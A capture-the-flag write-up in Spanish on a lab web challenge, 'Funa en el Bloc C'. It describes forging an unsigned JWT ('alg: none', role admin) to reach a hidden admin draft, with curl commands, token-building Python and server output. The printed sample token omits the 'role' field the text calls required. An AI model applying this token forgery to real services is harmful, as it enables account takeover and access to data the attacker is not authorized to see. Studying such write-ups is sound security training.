# Funa en el Bloc C — muro de convivencia

| Campo | Valor |
|---|---|
| Categoría | Web — JWT / confusión de algoritmo (`alg: none`) |
| URL | `https://<host>/login` |
| Credenciales | `vecino_c204` / `Bloc2026!` |
| Estado | ✅ Resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado (resumen)

El Bloc C se modernizó: un portal interno («Muro de Convivencia») con avisos,
reclamos y funas vecinales. Algunos vecinos juran haber visto cosas raras.
Hay que entrar con el usuario de residente y descubrir qué está pasando.

## 1. Acceso

`GET /login` muestra un formulario `POST` con campos **`usuario`** y `password`
(no `username` — con el nombre equivocado devuelve «Usuario o contraseña
incorrectos»).

```bash
curl -s -c jar.txt -b "$TRAMA" -L \
  --data-urlencode "usuario=vecino_c204" \
  --data-urlencode "password=Bloc2026!" \
  https://<host>/login
```

La sesión queda en la cookie **`vecino_token`**, un JWT:

```json
{"alg":"HS256","typ":"JWT"}
{"user":"vecino_c204","nombre":"Vecino Depto 204","depto":"C-204","role":"vecino"}
```

## 2. Las pistas del muro

Dos publicaciones son la guía del reto:

> **Comité:** «Existe una publicación marcada como **borrador** dentro del sistema
> (informe de la última reunión extraordinaria). Los borradores solo son visibles
> para la administración del edificio.»
>
> **Anónimo – Piso 2:** «Un vecino comentó que la sesión se puede *editar así
> nomás* y que vio algo de **`alg`** y **`none`** en la consola.»

Y el propio `/perfil` («Panel de sesión») lo confirma, mostrando el token en crudo
y su decodificación:

> «Este token viaja en la cookie `vecino_token`. **El servidor confía en lo que
> declara el campo `alg` del header** para decidir cómo debe verificarlo.»

Es un caso de libro de **JWT algorithm confusion**: si el servidor acepta
`alg: none`, cualquiera puede reescribir el payload sin firma.

## 3. Exploit

Se reemplaza el header por `{"alg":"none","typ":"JWT"}` y el payload por uno con
`role: admin`, dejando la firma vacía:

```python
payload = {"user": "admin", "nombre": "Administración", "depto": "ADMIN", "role": "admin"}
token = b64({"alg": "none", "typ": "JWT"}) + "." + b64(payload) + "."
```

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
eyJ1c2VyIjoiYWRtaW4iLCJub21icmUiOiJBZG1pbmlzdHJhY2nDs24iLCJkZXB0byI6IkFETUlOIn0.
```

(la firma queda vacía, con o sin el punto final; el servidor lo acepta igual)

`GET /denuncias` pasa a mostrar `Rol actual: admin` y, con ese rol, se habilita el
borrador:

```bash
curl -s -b "$TRAMA; vecino_token=$ADMIN" \
  https://<host>/denuncias/borrador
```

```
Rol: administración del edificio

Informe oficial - Reunión extraordinaria del Bloque C
...
Código de validación del informe
flag{ejemplo}
```

Con el token legítimo de vecino, la misma ruta devuelve **403**.

## 4. Detalles

- El `role` debe ir en el payload: sin él, el servidor acepta el token
  («Hola, Administración»), pero `Rol actual:` queda vacío y el borrador sigue
  oculto.
- `alg: none`, `None` y `NONE` funcionan igual (comparación sin *case-sensitivity*).
- Un HS256 firmado con clave vacía es **rechazado** (302 al login): la debilidad no
  es una clave débil, es la aceptación de `alg: none`.
- Rutas típicas (`/admin`, `/panel`, `/borradores`, `/api`, `/internal`) no existen o
  devuelven 403; el borrador vive en **`/denuncias/borrador`**.

## Flag

```
flag{ejemplo}
```

## Archivos de la carpeta

| Ruta | Contenido |
|---|---|
| `flag.txt` | flag final |
| `CONTEXTO.md` | este writeup |
| `solucion/jwt_none.py` | prueba las variantes de `alg` y detecta la aceptada |
| `solucion/admin_token.py` | genera el token `alg:none` con `role=admin` y guarda el muro |
| `solucion/buscar_borrador.py` | descubre la ruta `/denuncias/borrador` |
| `work/` | login, muro como vecino, muro como admin y borrador |

> La cookie de plataforma `trama_session` y el JWT de residente están embebidos en
> los scripts para reproducibilidad; caducan al terminar el evento.
